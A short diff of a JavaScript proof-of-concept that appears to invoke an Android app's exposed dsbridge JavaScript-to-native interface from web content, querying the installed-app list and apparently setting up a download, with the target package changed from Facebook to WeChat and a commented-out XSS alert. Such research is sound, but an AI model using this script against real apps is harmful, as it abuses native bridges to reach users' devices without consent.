@@ -1,7 +1,7 @@
 <script>
 
   // alert("xss");
-                    var input = {"data":{"appKey":1,"packageName":"com.facebook.katana"},"_dscbstub":"dscb3"};
+                    var input = {"data":{"appKey":1,"packageName":"com.tencent.mm"},"_dscbstub":"dscb3"};
                 var _handleMessageFromNative = function(p1){
 
                           // get appKey
@@ -13,7 +13,7 @@
                 }
                 _dsbridge.call("_dsb.dsinit",JSON.stringify({"data":null}));
 
-                _dsbridge.call("download.queryAppList",JSON.stringify({"data":{"pkgNameList":"com.facebook.katana","pagingQueryId":"pagingQueryId"},"_dscbstub":"dscb2"}));
+                _dsbridge.call("download.queryAppList",JSON.stringify({"data":{"pkgNameList":"com.tencent.mm","pagingQueryId":"pagingQueryId"},"_dscbstub":"dscb2"}));
                 setTimeout(function() {
                           //download
                           alert(input.data.appKey);
